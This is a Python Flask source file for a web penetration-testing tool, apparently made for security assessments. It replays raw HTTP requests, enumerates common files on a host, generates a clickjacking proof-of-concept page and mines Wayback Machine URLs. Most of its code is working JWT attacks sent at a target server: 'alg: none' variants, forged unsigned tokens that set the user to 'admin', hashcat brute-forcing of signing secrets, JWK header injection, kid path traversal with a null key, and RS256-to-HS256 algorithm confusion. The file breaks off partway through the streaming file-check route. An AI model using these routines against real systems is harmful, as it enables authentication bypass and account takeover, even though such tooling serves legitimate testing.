from flask import Flask, render_template, request, jsonify, session, Response, stream_with_context
import jwt
import json
import requests
import re
import subprocess
import os
from urllib.parse import urlparse, parse_qs
import base64
from datetime import datetime
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import time
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.secret_key = os.getenv('APP_SECRET_KEY')

class HTTPRequestTool:
    def __init__(self):
        self.jwt_attacks = JWTAttacks(self)
        self.tools = Tools(self)
        self.third_party_analysis = Third_Party_Analysis(self)
        
        # Load header information from JSON file
        try:
            with open('http_headers.json', 'r', encoding='utf-8') as http_headers_file:
                header_data = json.load(http_headers_file)
                self.request_headers = header_data['request_headers']
                self.response_headers = header_data['response_headers']
        except Exception as e:
            print(f"Failed to load header information: {str(e)}")
            self.request_headers = {}
            self.response_headers = {}
        
        # Load common files from common_files.txt
        try:
            with open('common_files.txt', 'r', encoding='utf-8') as common_files_file:
                self.common_files = [line.strip() for line in common_files_file if line.strip()]
        except Exception as e:
            print(f"Failed to load common files: {str(e)}")
            self.common_files = []

    def check_common_files(self, request_text, use_proxy=False, proxy_address=None, verify=True):
        try:
            # Parse the request to get the base URL
            request_lines = request_text.split('\n')
            if not request_lines:
                return {"error": "No request found"}
            
            # Get the first line (method and path)
            first_line = request_lines[0].split()
            if len(first_line) < 2:
                return {"error": "Invalid request format"}
            
            # Get the full URL
            full_url = first_line[1]
            if not full_url.startswith('http'):
                # If host header exists, use it to construct full URL
                host = None
                for line in request_lines[1:]:
                    if line.lower().startswith('host:'):
                        host = line.split(':', 1)[1].strip()
                        break
                
                if not host:
                    return {"error": "Could not determine host"}
                
                full_url = f"https://{host}{full_url}"
            
            # Parse URL to get base
            parsed_url = urlparse(full_url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            # Get headers from original request
            headers = {}
            for line in request_lines[1:]:
                if ':' in line:
                    key, value = line.split(':', 1)
                    headers[key.strip()] = value.strip()
            
            # Configure proxy if enabled
            proxies = None
            if use_proxy:
                if not proxy_address:
                    return {"error": "Please enter a proxy address"}
                proxies = {
                    'http': proxy_address,
                    'https': proxy_address
                }
            
            # Load common files to check
            with open('common_files.txt', 'r') as f:
                common_files = [line.strip() for line in f if line.strip()]
            
            total_files = len(common_files)
            found_files = []
            checked_files = []
            
            for file_path in common_files:
                # Try the file path
                url = f"{base_url}{file_path}"
                try:
                    response = requests.get(
                        url, 
                        headers=headers, 
                        verify=verify,
                        proxies=proxies,
                        timeout=5,
                        allow_redirects=False
                    )
                    status = {
                        "file_path": file_path,
                        "url": url,
                        "status_code": response.status_code,
                        "success": response.status_code == 200
                    }
                    checked_files.append(status)
                    
                    if response.status_code == 200:
                        found_files.append({
                            "file_path": file_path,
                            "url": url,
                            "response_length": len(response.text)
                        })
                except Exception as e:
                    checked_files.append({
                        "file_path": file_path,
                        "url": url,
                        "status_code": 0,
                        "success": False,
                        "error": str(e)
                    })
            
            return {
                "total_files": total_files,
                "total_files_checked": len(checked_files),
                "files_found": len(found_files),
                "found_files": found_files,
                "checked_files": checked_files
            }
        except Exception as e:
            return {"error": f"Failed to check common files: {str(e)}"}

    def process_request(self, request_text, use_proxy=False, proxy_address=None, verify=True):
        try:
            # Parse the raw HTTP request
            request_lines = request_text.split('\n')
            if not request_lines:
                return {"error": "Empty request"}

            # Parse first line (method, path, version)
            first_line = request_lines[0].split()
            if len(first_line) < 2:
                return {"error": "Invalid request format"}
            
            method = first_line[0]
            path = first_line[1]
            
            headers = {}
            current_line = 1
            while current_line < len(request_lines) and request_lines[current_line].strip():
                header_line = request_lines[current_line].strip()
                if ':' in header_line:
                    key, value = header_line.split(':', 1)
                    headers[key.strip()] = value.strip()
                current_line += 1
            
            body = None
            if current_line < len(request_lines):
                body = '\n'.join(request_lines[current_line + 1:]).strip()
            
            if not path.startswith('http'):
                # If host header exists, use it to construct full URL
                host = headers.get('Host', '')
                if host:
                    path = f"https://{host}{path}"
                else:
                    return {"error": "No host specified in headers and path is not absolute URL"}
            else:
                if path.startswith('http://'):
                    path = path.replace('http://', 'https://', 1)
            
            # Configure proxy if enabled
            proxies = None
            if use_proxy:
                if not proxy_address:
                    return {"error": "Please enter a proxy address"}
                
                if not proxy_address.startswith(('http://', 'https://')):
                    proxy_address = 'http://' + proxy_address
                
                proxies = {
                    'http': proxy_address,
                    'https': proxy_address
                }
            
            # Send the request
            response = requests.request(
                method=method,
                url=path,
                headers=headers,
                data=body,
                verify=verify,
                proxies=proxies,
                allow_redirects=False 
            )
            
            response_text = f"HTTP/{response.raw.version / 10.0} {response.status_code} {response.reason}\r\n"
            for key, value in response.headers.items():
                response_text += f"{key}: {value}\r\n"
            response_text += "\r\n"
            response_text += response.text
            
            jwt_tokens = self.jwt_attacks.find_jwt(request_text)
            jwt_decoded = ""
            if jwt_tokens:
                for i, token in enumerate(jwt_tokens, 1):
                    jwt_decoded += f"JWT #{i}:\n{self.jwt_attacks.decode_jwt(token)}\n\n"
            
            return {
                "response": response_text,
                "jwt_tokens": jwt_decoded
            }
            
        except Exception as e:
            return {"error": f"Error processing request: {str(e)}"}

    def analyze_headers(self, request_text):
        try:
            # Parse the request to get headers
            request_lines = request_text.split('\n')
            if not request_lines:
                return {"error": "No request found"}
            
            # Get headers from request
            request_headers = {}
            for line in request_lines[1:]:  # Skip first line (method and path)
                if not line.strip():  # Empty line indicates end of headers
                    break
                if ':' in line:
                    key, value = line.split(':', 1)
                    request_headers[key.strip()] = value.strip()
            
            # Load header information from JSON file
            try:
                with open('http_headers.json', 'r', encoding='utf-8') as f:
                    header_data = json.load(f)
                    request_headers_db = header_data['request_headers']
                    response_headers_db = header_data['response_headers']
            except Exception as e:
                return {"error": f"Failed to load header database: {str(e)}"}
            
            # Analyze request headers
            request_analysis = []
            for header, value in request_headers.items():
                header_lower = header.lower()
                description = None
                
                # Check request headers
                for db_header, db_desc in request_headers_db.items():
                    if header_lower == db_header.lower():
                        description = db_desc
                        break
                
                # Add to analysis
                request_analysis.append({
                    "header": header,
                    "value": value,
                    "description": description or "Custom Header",
                    "is_standard": bool(description),
                    "type": "request"
                })
            
            # Check if there's a response section in the request text
            response_headers = {}
            in_response = False
            for line in request_lines:
                # Look for HTTP response status line (e.g., "HTTP/1.1 200 OK")
                if line.strip().startswith('HTTP/'):
                    in_response = True
                    continue
                
                # If we're in the response section and find a header
                if in_response and ':' in line:
                    key, value = line.split(':', 1)
                    response_headers[key.strip()] = value.strip()
                # Stop at empty line after response headers
                elif in_response and not line.strip():
                    break
            
            # Analyze response headers
            response_analysis = []
            for header, value in response_headers.items():
                header_lower = header.lower()
                description = None
                
                # Check response headers
                for db_header, db_desc in response_headers_db.items():
                    if header_lower == db_header.lower():
                        description = db_desc
                        break
                
                # Add to analysis
                response_analysis.append({
                    "header": header,
                    "value": value,
                    "description": description or "Custom Header",
                    "is_standard": bool(description),
                    "type": "response"
                })
            
            # Combine analyses
            all_headers = request_analysis + response_analysis
            
            return {
                "total_headers": len(all_headers),
                "request_headers": len(request_analysis),
                "response_headers": len(response_analysis),
                "standard_headers": sum(1 for h in all_headers if h["is_standard"]),
                "custom_headers": sum(1 for h in all_headers if not h["is_standard"]),
                "headers": all_headers
            }
            
        except Exception as e:
            return {"error": f"Failed to analyze headers: {str(e)}"}

class JWTAttacks:
    def __init__(self, http_request_tool):
        self.http_request_tool = http_request_tool

    def is_jwt(self, token):
        # Split the token into parts
        parts = token.split('.')

        # We only care about header and body
        if len(parts) < 2:
            return False

        try:
            # Check if header and body are valid base64
            for part in parts[:2]:  # Only check header and body
                if part:  # Skip empty parts
                    # Add padding if needed
                    padding = 4 - (len(part) % 4)
                    if padding != 4:
                        part += '=' * padding
                    decoded = base64.b64decode(part)
                    # Try to parse as JSON to verify structure
                    json.loads(decoded)
            return True
        except:
            return False

    def decode_jwt(self, token):
        try:
            # Split the token into parts
            parts = token.split('.')

            # We only care about header and body
            if len(parts) < 2:
                return "Invalid JWT format"

            # Decode header and body
            decoded_parts = []
            for part in parts[:2]:  # Only process header and body
                if part:
                    # Add padding if needed
                    padding = 4 - (len(part) % 4)
                    if padding != 4:
                        part += '=' * padding
                    decoded = base64.b64decode(part)
                    try:
                        # Try to parse as JSON
                        decoded_parts.append(json.loads(decoded))
                    except:
                        # If not JSON, just use the decoded string
                        decoded_parts.append(decoded.decode('utf-8'))

            # Format the output
            output = []
            if len(decoded_parts) >= 1:
                output.append(f"Header:\n{json.dumps(decoded_parts[0], indent=2)}")
            if len(decoded_parts) >= 2:
                output.append(f"\nPayload:\n{json.dumps(decoded_parts[1], indent=2)}")

            return '\n'.join(output)
        except Exception as e:
            return f"Error decoding JWT: {str(e)}"

    def encode_jwt(self, header, payload, signature=None):
        try:
            # Encode header and payload as JSON with no extra whitespace
            header_json = json.dumps(header, separators=(',', ':'))
            payload_json = json.dumps(payload, separators=(',', ':'))

            # Base64url encode the JSON strings
            # First encode to bytes, then base64url encode, then decode to string
            # Remove padding characters (=) as per RFC 7519
            encoded_header = base64.urlsafe_b64encode(
                header_json.encode('utf-8')
            ).decode('utf-8').rstrip('=')

            encoded_payload = base64.urlsafe_b64encode(
                payload_json.encode('utf-8')
            ).decode('utf-8').rstrip('=')

            # Construct the token parts
            token_parts = [encoded_header, encoded_payload]

            # For unsigned tokens (none algorithm), add empty signature
            if signature is None:
                token_parts.append('')
            else:
                # For signed tokens, encode the signature
                encoded_signature = base64.urlsafe_b64encode(
                    signature.encode('utf-8')
                ).decode('utf-8').rstrip('=')
                token_parts.append(encoded_signature)

            # Join parts with period character
            return '.'.join(token_parts)
        except Exception as e:
            return f"Error encoding JWT: {str(e)}"

    def find_jwt(self, request_text):
        # Split request into words and check each for JWT pattern
        tokens = []
        seen_tokens = set()  # Track seen tokens to avoid duplicates

        # Find all potential JWT patterns in the text
        jwt_pattern = r'(?:Bearer\s+)?([A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+(?:\.[A-Za-z0-9-_=]+)?)'

        # Look for JWTs in headers and cookies
        for line in request_text.split('\n'):
            # Check for Authorization header
            if 'Authorization:' in line:
                matches = re.findall(jwt_pattern, line)
                for token in matches:
                    if token not in seen_tokens and self.is_jwt(token):
                        tokens.append(token)
                        seen_tokens.add(token)

            # Check for Cookie header
            if 'Cookie:' in line:
                # Extract all cookie values
                cookie_pairs = line.split(':', 1)[1].strip().split(';')
                for pair in cookie_pairs:
                    if '=' in pair:
                        cookie_name, cookie_value = pair.strip().split('=', 1)
                        if cookie_value:
                            matches = re.findall(jwt_pattern, cookie_value)
                            for token in matches:
                                if token not in seen_tokens and self.is_jwt(token):
                                    tokens.append(token)
                                    seen_tokens.add(token)
                    else:
                        # Handle case where cookie value might be a JWT
                        cookie_value = pair.strip()
                        matches = re.findall(jwt_pattern, cookie_value)
                        for token in matches:
                            if token not in seen_tokens and self.is_jwt(token):
                                tokens.append(token)
                                seen_tokens.add(token)

            # Check for other potential JWT-containing headers
            if ':' in line:
                header_value = line.split(':', 1)[1].strip()
                matches = re.findall(jwt_pattern, header_value)
                for token in matches:
                    if token not in seen_tokens and self.is_jwt(token):
                        tokens.append(token)
                        seen_tokens.add(token)

        # Also check the entire text for any JWTs we might have missed
        all_matches = re.findall(jwt_pattern, request_text)
        for token in all_matches:
            if token not in seen_tokens and self.is_jwt(token):
                tokens.append(token)
                seen_tokens.add(token)

        return tokens

    def unverified_signature_attack(self, token, request_text, use_proxy=False, proxy_address=None, verify=True):
        try:
            # Decode the JWT without verification
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})

            # Modify a value in the payload
            if 'sub' in payload:
                payload['sub'] = 'admin'
            elif 'role' in payload:
                payload['role'] = 'admin'
            else:
                payload['modified'] = 'true'

            # Create a new token with the modified payload
            modified_token = jwt.encode(payload, "", algorithm="none")

            # Replace the original token in the request
            modified_request = request_text.replace(token, modified_token)

            # Send the modified request
            response = self.http_request_tool.process_request(
                modified_request,
                use_proxy=use_proxy,
                proxy_address=proxy_address,
                verify=verify
            )

            # Get the response status code
            status_code = 0
            if "response" in response:
                try:
                    status_line = response["response"].split('\n')[0]
                    status_code = int(status_line.split()[1])
                except (IndexError, ValueError):
                    pass

            return {
                "success": status_code < 400,
                "modified_token": modified_token,
                "status_code": status_code,
                "response": response.get("response", "")
            }

        except Exception as e:
            return {"error": f"Failed to perform unverified signature attack: {str(e)}"}

    def none_signature_attack(self, token, request_text, use_proxy=False, proxy_address=None, verify=True):
        try:
            # Decode the JWT without verification
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})

            # Try different variations of "none"
            none_variations = ["none", "None", "NONE", "nOnE"]
            results = []
            success = False
            successful_variation = None
            successful_token = None
            successful_response = None

            for variation in none_variations:
                try:
                    # Create a new header with the current variation
                    new_header = header.copy()
                    new_header["alg"] = variation

                    # Create a new token using our own encoding method
                    # This gives us full control over the header values
                    modified_token = self.encode_jwt(new_header, payload)

                    # Replace the original token in the request
                    modified_request = request_text.replace(token, modified_token)

                    # Send the modified request
                    response = self.http_request_tool.process_request(
                        modified_request,
                        use_proxy=use_proxy,
                        proxy_address=proxy_address,
                        verify=verify
                    )

                    # Get the response status code
                    status_code = 0
                    if "response" in response:
                        try:
                            status_line = response["response"].split('\n')[0]
                            status_code = int(status_line.split()[1])
                        except (IndexError, ValueError):
                            pass

                    # Add result for this variation
                    result = {
                        "variation": variation,
                        "token": modified_token,
                        "header": new_header,
                        "status_code": status_code,
                        "success": status_code in [200, 302],
                        "response": response.get("response", "")
                    }
                    results.append(result)

                    # If we get a success response (200 or 302), keep this variation
                    if status_code in [200, 302]:
                        success = True
                        successful_variation = variation
                        successful_token = modified_token
                        successful_response = response.get("response", "")
                        break  # Stop after first successful attempt
                except Exception as e:
                    # If this variation fails, log it and continue to the next one
                    results.append({
                        "variation": variation,
                        "error": str(e),
                        "success": False
                    })
                    continue

            if success:
                return {
                    "success": True,
                    "modified_token": successful_token,
                    "successful_variation": successful_variation,
                    "all_results": results,
                    "response": successful_response,
                    "details": f"Successfully created token with 'alg' set to '{successful_variation}'"
                }
            else:
                return {
                    "success": False,
                    "all_results": results,
                    "error": "All variations of 'none' algorithm failed"
                }

        except Exception as e:
            return {"error": f"Failed to perform none signature attack: {str(e)}"}

    def brute_force_secret(self, token):
        try:
            # Validate token format
            if not token or '.' not in token:
                return {
                    "success": False,
                    "error": "Invalid JWT token format",
                    "details": "The token must be a valid JWT with at least two parts separated by dots",
                    "output": []
                }

            # Save token to temp file for hashcat
            temp_file = 'token.txt'
            with open(temp_file, 'w') as f:
                f.write(token)

            # Verify wordlist exists and has content
            wordlist_path = 'jwt_secrets/jwt.secrets.list'
            if not os.path.exists(wordlist_path):
                return {
                    "success": False,
                    "error": "Wordlist not found",
                    "details": f"Wordlist file not found at {wordlist_path}",
                    "output": []
                }

            wordlist_size = os.path.getsize(wordlist_path)
            if wordlist_size == 0:
                return {
                    "success": False,
                    "error": "Empty wordlist",
                    "details": "The wordlist file is empty",
                    "output": []
                }

            # Run hashcat with jwt.secrets.list wordlist
            cmd = [
                'hashcat',
                '-a', '0', # Straight attack mode
                '-m', '16500', # JWT hash mode
                '--force', # Ignore warnings
                '--potfile-disable', # Don't use potfile
                temp_file,
                wordlist_path
            ]

            # Print debug info
            debug_info = [
                f"Token: {token}",
                f"Token length: {len(token)}",
                f"Wordlist path: {wordlist_path}",
                f"Wordlist size: {wordlist_size} bytes",
                f"Command: {' '.join(cmd)}"
            ]

            process = subprocess.run(cmd, capture_output=True, text=True)

            # Clean up temp file
            if os.path.exists(temp_file):
                os.remove(temp_file)

            # Check if hashcat found a match
            if process.returncode == 0 or 'Cracked' in process.stdout:
                # Parse hashcat output to get cracked secret
                for line in process.stdout.split('\n'):
                    if ':' in line and not line.startswith('#'):
                        secret = line.split(':')[-1].strip()
                        return {
                            "success": True,
                            "secret": secret,
                            "details": f"Found matching secret key: {secret}",
                            "output": debug_info + process.stdout.split('\n')
                        }

            # If we get here, no secret was found
            return {
                "success": False,
                "error": "No matching secret found in wordlist",
                "details": "The secret key was not found in the provided wordlist. Please check if the wordlist contains the correct secret.",
                "output": debug_info + process.stdout.split('\n') + process.stderr.split('\n')
            }

        except Exception as e:
            return {
                "success": False,
                "error": f"Failed to perform brute force attack: {str(e)}",
                "details": str(e),
                "output": []
            }

    def jwk_header_injection(self, token):
        try:
            # Decode the JWT without verification
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})

            # Generate a new RSA key pair
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
                backend=default_backend()
            )

            # Get the public key in JWK format
            public_key = private_key.public_key()
            public_numbers = public_key.public_numbers()

            # Create JWK header
            new_header = {
                "alg": "RS256",
                "jwk": {
                    "kty": "RSA",
                    "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes(256, byteorder='big')).decode('utf-8').rstrip('='),
                    "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes(3, byteorder='big')).decode('utf-8').rstrip('=')
                }
            }

            # Sign the token with the private key
            modified_token = jwt.encode(
                payload,
                private_key,
                algorithm='RS256',
                headers=new_header
            )

            return {
                "success": True,
                "modified_token": modified_token,
                "details": "Created token with injected JWK header and signed with generated RSA key"
            }

        except Exception as e:
            return {"error": f"Failed to perform JWK header injection attack: {str(e)}"}

    def kid_header_traversal(self, token, request_text, use_proxy=False, proxy_address=None, verify=True):
        try:
            # Decode the JWT without verification
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})

            # Try different null device paths
            null_paths = [
                "/dev/null",
                "\\dev\\null",
                "null",
                "NULL",
                "Null",
                "/dev/zero",
                "\\dev\\zero",
                "zero",
                "ZERO",
                "Zero"
            ]

            results = []
            success = False
            successful_path = None
            successful_token = None
            successful_response = None

            for path in null_paths:
                # Create a new header with the current path
                new_header = header.copy()
                new_header["kid"] = path

                # Create a null key
                null_key = base64.b64decode("AA==")
                modified_token = jwt.encode(
                    payload,
                    null_key,
                    algorithm="HS256",
                    headers=new_header
                )

                # Replace the original token in the request
                modified_request = request_text.replace(token, modified_token)

                # Send the modified request
                response = self.http_request_tool.process_request(
                    modified_request,
                    use_proxy=use_proxy,
                    proxy_address=proxy_address,
                    verify=verify
                )

                # Get the response status code
                status_code = 0
                if "response" in response:
                    try:
                        status_line = response["response"].split('\n')[0]
                        status_code = int(status_line.split()[1])
                    except (IndexError, ValueError):
                        pass

                # Add result for this path
                result = {
                    "path": path,
                    "token": modified_token,
                    "header": new_header,
                    "status_code": status_code,
                    "success": status_code in [200, 302],
                    "response": response.get("response", "")
                }
                results.append(result)

                # If we get a success response (200 or 302), keep this path
                if status_code in [200, 302]:
                    success = True
                    successful_path = path
                    successful_token = modified_token
                    successful_response = response.get("response", "")
                    break  # Stop after first successful attempt

            if success:
                return {
                    "success": True,
                    "modified_token": successful_token,
                    "successful_path": successful_path,
                    "all_results": results,
                    "response": successful_response,
                    "details": f"Successfully created token with KID path traversal: {successful_path}"
                }
            else:
                return {
                    "success": False,
                    "all_results": results,
                    "error": "All KID path traversal attempts failed"
                }

        except Exception as e:
            return {"error": f"Failed to perform KID header traversal attack: {str(e)}"}

    def algorithm_confusion(self, token):
        try:
            # Decode the JWT without verification
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})

            # Get the public key from the token's header
            if 'jwk' not in header:
                return {"error": "No JWK found in token header"}

            jwk = header['jwk']
            if jwk['kty'] != 'RSA':
                return {"error": "Only RSA keys are supported for this attack"}

            # Get the raw n and e values from the JWK
            n = base64.urlsafe_b64decode(jwk['n'] + '=' * (-len(jwk['n']) % 4))
            e = base64.urlsafe_b64decode(jwk['e'] + '=' * (-len(jwk['e']) % 4))

            # Create an RSA public key object
            public_key = rsa.RSAPublicNumbers(
                int.from_bytes(e, byteorder='big'),
                int.from_bytes(n, byteorder='big')
            ).public_key(default_backend())

            # Convert the public key to PEM format
            pem = public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )

            # Base64 encode the PEM
            pem_base64 = base64.b64encode(pem).decode('utf-8')

            # Create a new header
            new_header = header.copy()
            new_header["alg"] = "HS256"

            # Sign the token with the PEM-encoded key as the HMAC secret
            modified_token = jwt.encode(
                payload,
                pem_base64,
                algorithm='HS256',
                headers=new_header
            )

            return {
                "success": True,
                "modified_token": modified_token,
                "details": "Created token using algorithm confusion attack (RSA public key as HMAC secret)"
            }

        except Exception as e:
            return {"error": f"Failed to perform algorithm confusion attack: {str(e)}"}

    def edit_jwt(self, decoded_text, use_secret=False, secret=''):
        try:
            # Split the decoded text into sections
            sections = decoded_text.split('\n\n')
            header = None
            payload = None
            
            for section in sections:
                if 'Header:' in section:
                    # Extract the JSON part after "Header:"
                    header_json = section.split('Header:')[1].strip()
                    try:
                        header = json.loads(header_json)
                    except json.JSONDecodeError as e:
                        return {"error": f"Invalid JSON in Header section: {str(e)}"}
                
                elif 'Payload:' in section:
                    # Extract the JSON part after "Payload:"
                    payload_json = section.split('Payload:')[1].strip()
                    try:
                        payload = json.loads(payload_json)
                    except json.JSONDecodeError as e:
                        return {"error": f"Invalid JSON in Payload section: {str(e)}"}
            
            if header is None or payload is None:
                return {"error": "Missing Header or Payload section"}

            # Encode the JWT
            if use_secret and secret:
                # Use the algorithm from the header or default to HS256
                algorithm = header.get('alg', 'HS256')
                
                try:
                    # Create the token using PyJWT for signed tokens
                    encoded_token = jwt.encode(
                        payload=payload,
                        key=secret,
                        algorithm=algorithm,
                        headers=header
                    )
                except Exception as e:
                    return {"error": f"Failed to encode JWT with secret: {str(e)}"}
            else:
                try:
                    # For unsigned tokens, use our own encoding method
                    encoded_token = self.encode_jwt(header, payload)
                except Exception as e:
                    return {"error": f"Failed to encode unsigned JWT: {str(e)}"}

            return {
                "encoded_token": encoded_token,
                "success": True
            }
        except Exception as e:
            return {"error": f"Unexpected error in JWT encoding: {str(e)}"}

class Tools:
    def __init__(self, http_request_tool):
        self.http_request_tool = http_request_tool
    
    def generate_clickjack(self, url):
        clickjack_html = f"""<html>
   <head>
      <title>Clickjacking Example PoC</title>
      <style>
         body {{
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
         }}
         .container {{
            max-width: 1200px;
            margin: 0 auto;
         }}
         h1 {{
            color: #333;
            margin-bottom: 20px;
         }}
         .iframe-container {{
            position: relative;
            width: 100%;
            height: 80vh;
         }}
         iframe {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.5;
            border: 2px solid #333;
         }}
      </style>
   </head>
   <body>
      <div class="container">
         <h1>Aon Clickjacking PoC</h1>
         <div class="iframe-container">
            <iframe src="{url}"></iframe>
         </div>
      </div>
   </body>
</html>"""
        return {"html": clickjack_html}

class Third_Party_Analysis:
    def __init__(self, http_request_tool):
        self.http_request_tool = http_request_tool
    
    def search_wayback_machine(self, url):
        try:
            # Extract domain from URL
            parsed_url = urlparse(url)
            domain = parsed_url.netloc
            
            # Configure session with retries and longer timeout
            session = requests.Session()
            retry = requests.adapters.HTTPAdapter(max_retries=5)  # Increased retries
            session.mount('https://', retry)
            session.mount('http://', retry)
            
            # Initialize variables for pagination
            page = 0
            page_size = 100  # Increased page size
            all_results = []
            max_results = 150000
            seen_urls = set()  # Track unique URLs
            
            # First get total number of pages
            num_pages_url = f"https://web.archive.org/cdx/search/cdx?url={domain}&matchType=domain&output=json&showNumPages=true"
            try:
                num_pages_response = session.get(num_pages_url, timeout=60)
                if num_pages_response.status_code == 200:
                    total_pages = int(num_pages_response.text.strip())
                else:
                    total_pages = 1
            except:
                total_pages = 1
            
            yield {"output": f"Starting Wayback Machine search for {domain}\nTotal pages to search: {total_pages}\n", "done": False}
            
            while page < total_pages and len(all_results) < max_results:
                yield {"output": f"Searching page {page + 1} of {total_pages}...\n", "done": False}
                
                # Construct the Wayback Machine CDX API URL
                wayback_url = f"https://web.archive.org/cdx/search/cdx?url={domain}&matchType=domain&output=json&fl=timestamp,original,mimetype,statuscode,digest,length&collapse=urlkey&page={page}&pageSize={page_size}"
                
                try:
                    response = session.get(wayback_url, timeout=60)
                    
                    if response.status_code == 429:
                        yield {"output": "Rate limited. Waiting 10 seconds before retrying...\n", "done": False}
                        time.sleep(10)  # Increased wait time
                        continue
                    
                    if response.status_code != 200:
                        yield {"error": f"Failed to fetch data (Status code: {response.status_code})", "done": True}
                        return
                    
                    data = response.json()
                    if not data or len(data) <= 1:
                        break
                    
                    # Process results
                    for row in data[1:]:
                        try:
                            timestamp, original, mimetype, statuscode, digest, length = row
                            if not all([timestamp, original, mimetype, statuscode, digest, length]):
                                continue
                            
                            # Skip if we've already seen this URL
                            if original in seen_urls:
                                continue
                            seen_urls.add(original)
                            
                            # Add result to collection
                            all_results.append({
                                "timestamp": timestamp,
                                "original": original,
                                "mimetype": mimetype,
                                "statuscode": statuscode,
                                "length": length
                            })
                            
                            # Format and yield the result
                            try:
                                date = datetime(
                                    int(timestamp[0:4]),
                                    int(timestamp[4:6]),
                                    int(timestamp[6:8]),
                                    int(timestamp[8:10]),
                                    int(timestamp[10:12]),
                                    int(timestamp[12:14])
                                )
                                
                                result_text = f"\nFound URL: {original}\n"
                                result_text += f"First Archived: {date.strftime('%Y-%m-%d %H:%M:%S')}\n"
                                result_text += f"Status: {statuscode}\n"
                                result_text += f"Type: {mimetype}\n"
                                result_text += f"Size: {(int(length) / 1024):.2f} KB\n"
                                result_text += f"Archive Link: https://web.archive.org/web/{timestamp}/{original}\n"
                                result_text += "-" * 80 + "\n"
                                yield {"output": result_text, "done": False}
                            except Exception as e:
                                result_text = f"\nFound URL: {original}\n"
                                result_text += f"Timestamp: {timestamp}\n"
                                result_text += f"Status: {statuscode}\n"
                                result_text += f"Type: {mimetype}\n"
                                result_text += f"Size: {(int(length) / 1024):.2f} KB\n"
                                result_text += f"Archive Link: https://web.archive.org/web/{timestamp}/{original}\n"
                                result_text += "-" * 80 + "\n"
                                yield {"output": result_text, "done": False}
                            
                            if len(all_results) >= max_results:
                                break
                            
                        except Exception as e:
                            yield {"output": f"Error processing result: {str(e)}\n", "done": False}
                            continue
                    
                    page += 1
                    time.sleep(2)  # Increased delay between requests
                    
                except requests.Timeout:
                    yield {"output": "Request timed out. Waiting 10 seconds before retrying...\n", "done": False}
                    time.sleep(10)
                    continue
                except requests.RequestException as e:
                    yield {"error": f"Failed to connect to Wayback Machine: {str(e)}", "done": True}
                    return
            
            yield {"output": f"\nSearch completed. Found {len(all_results)} unique URLs.\n", "done": True}
            
        except Exception as e:
            yield {"error": f"Failed to search Wayback Machine: {str(e)}", "done": True}

# Initialize the HTTP request tool
http_tool = HTTPRequestTool()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/process_request', methods=['POST'])
def process_request():
    data = request.get_json()
    return jsonify(http_tool.process_request(
        data.get('request_text', ''),
        data.get('use_proxy', False),
        data.get('proxy_address'),
        data.get('verify', True)
    ))

@app.route('/generate_clickjack', methods=['POST'])
def generate_clickjack():
    data = request.get_json()
    return jsonify(http_tool.tools.generate_clickjack(data.get('url', '')))

@app.route('/check_common_files', methods=['POST'])
def check_common_files():
    try:
        data = request.get_json()
        request_text = data.get('request_text', '')
        use_proxy = data.get('use_proxy', False)
        proxy_address = data.get('proxy_address', '')
        verify = data.get('verify', True)

        if not request_text:
            return jsonify({'error': 'No request text provided'}), 400

        # Parse the request to get the base URL
        lines = request_text.split('\n')
        if not lines:
            return jsonify({'error': 'Invalid request format'}), 400

        first_line = lines[0].strip()
        if not first_line:
            return jsonify({'error': 'Invalid request format'}), 400

        # Extract the URL from the first line
        parts = first_line.split()
        if len(parts) < 2:
            return jsonify({'error': 'Invalid request format'}), 400

        method, path = parts[0], parts[1]
        if not path.startswith('http'):
            # If it's a relative path, we need the Host header
            host = None
            for line in lines[1:]:
                if line.lower().startswith('host:'):
                    host = line.split(':', 1)[1].strip()
                    break
            if not host:
                return jsonify({'error': 'No Host header found'}), 400
            base_url = f"https://{host}"
        else:
            base_url = path.split('?')[0]  # Remove query parameters

        # Load common files to check
        with open('common_files.txt', 'r') as f:
            common_files = [line.strip() for line in f if line.strip()]

        total_files = len(common_files)
        found_files = []
        checked_files = []

        def generate():
            # Send initial progress
            yield json.dumps({
                'total_files': total_files,
                'total_files_checked': 0,
                'files_found': 0,
                'checked_files': [],
                'found_files': []
            }) + '\n'

            # Check each file
            for file_path in common_files:
                # Send current file being checked
                yield json.dumps({
                    'total_files': total_files,
                    'total_files_checked': len(checked_files),
                    'files_found': len(found_files),
                    'checked_files': checked_files,
                    'found_files': found_files
                }) + '\n'

                try:
                    url = f"{base_url.rstrip('/')}/{file_path.lstrip('/')}"
                    response = requests.head(
                        url,
                        proxies={'http': proxy_address, 'https': proxy_address} if use_proxy else None,
                        verify=verify,
                        timeout=5
                    )
                    
                    success = response.status_code == 200
                    if success:
                        # If successful, get the full response to check content
                        response = requests.get(
                            url,
                            proxies={'http': proxy_address, 'https': proxy_address} if use_proxy else None,
                            verify=verify,
                            timeout=5
                        )
                        found_files.append({
                            "file_path": file_path,
                            "url": url,
                            "response_length": len(response.content)
                        })
                    
                    checked_files.append({
                        'file_path': file_path,
                        'success': success,
                        'status_code': response.status_code,
                        'response_length': len(response.content) if success else None
                    })

                    # Send progress update
                    yield json.dumps({
                        'total_files': total_files,
                        'total_files_checked': len(checked_files),
                        'files_found': len(found_files),
                        'checked_files': checked_files,
                        'found_files': found_files
                    }) + '\n'

                except Exception as e:
                    checked_files.append({
                        'file_path': file_path,
                        'success': False,
                        'status_code': None,
                        'error': str(e)
                    })
                    # Send progress update with error
                    yield json.dumps({
